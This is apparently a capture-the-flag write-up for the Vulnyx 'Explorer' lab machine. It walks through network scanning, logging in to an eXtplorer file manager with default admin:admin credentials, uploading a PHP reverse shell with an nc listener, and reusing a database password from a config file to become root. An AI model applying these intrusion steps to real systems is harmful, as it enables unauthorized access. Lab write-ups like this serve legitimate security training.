# üñ•Ô∏è Writeup - Explorer 

**Platform:** Vulnyx  
**Operating System:** Linux  

# INSTALLATION

We download the `zip` containing the `.ova` of the Explorer machine, extract it, and import it into VirtualBox.

We configure the network interface of the Explorer machine and run it alongside the attacker machine.

# HOST DISCOVERY

At this point, we still don‚Äôt know which `IP` address is assigned to Explorer, so we discover it as follows:

```bash
netdiscover -i eth1 -r 10.0.0.0/16
```
Info:

 10.0.4.22       08:00:27:a0:a2:05      1      60  PCS Systemtechnik GmbH
 ```

 We identify with high confidence that the victim‚Äôs IP is `10.0.4.22`.

 # PORT SCANNING

Next, we perform a general scan to check which ports are open, followed by a more exhaustive scan to gather relevant service information.

```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 10.0.4.22
``` 

```bash
nmap -n -Pn -sCV -p22,80 --min-rate 5000 10.0.4.22
```

Ports `22` and `80` are open.

We access the web service over `HTTP`, the server is running but there is no content yet.

The scan reveals a `robots.txt` file, and it contains a Disallow entry for `/extplorer`.

![alt text](../images/robots.png)

Encontramos una disallowed entry, un directorio llamado /extplorer.

We navigate to `/extplorer` and encounter a `login` page.

![alt text](../images/loginex.png)

We try common/default credentials such as `admin` : `admin`.

The default credentials work, so we log in to an admin panel that appears to be a web file manager supporting uploads and downloads.

We upload a `PHP` reverse shell (PentestMonkey‚Äôs `php-reverse-shell`).

![alt text](../images/revvshell.png)

Before any further action, we start a `listener` on our attacker machine.

```bash
sudo nc -nlvp 4444
```

We now execute the uploaded file at `http://10.0.4.22/shell.php` and obtain a `reverse shell` as user `www-data`.

Info:
```

```

We have obtained a `reverse shell` as the user `www-data`!

In `/home` we find the `user flag`.

```

```

# TTY

Before attempting privilege escalation, we upgrade the `TTY` for a more interactive shell:

```bash
script /dev/null -c bash
```
`ctrl Z`
```bash
stty raw -echo; fg
```
```bash
reset xterm
```
```bash
export TERM=xterm
```
```bash
export BASH=bash
```

# PRIVILEGE ESCALATION

We check for `sudo` privileges, `SUID` binaries, and Linux `capabilities`.

However, no obvious privilege escalation vectors are found.

Under `/var/www/html/extplorer/config` we find `conf.php`:

```
$GLOBALS['DB_HOST'] = 'localhost';
$GLOBALS['DB_NAME'] = 'webdav';
$GLOBALS['DB_USER'] = 'root';
$GLOBALS['DB_PASSWORD'] = 'AccessGranted#1';
$GLOBALS['DB_TYPE'] = 'mysql'; // Name of the Database Server Type (see http://en.php.net/manual/en/pdo.drivers.php for more)
```

Reading it reveals `MySQL` credentials `root` : `AccessGranted#1`, but the `MySQL` service appears to be down or inaccessible.

We try the same password on the system `root` account.

```bash
su root
```

Info:
```
root@explorer:/var/www/html/extplorer/config# whoami
root
root@explorer:/var/www/html/extplorer/config#
```

It works, and we obtain a `root` shell!

In `/root` we find the `root flag`:

```

```
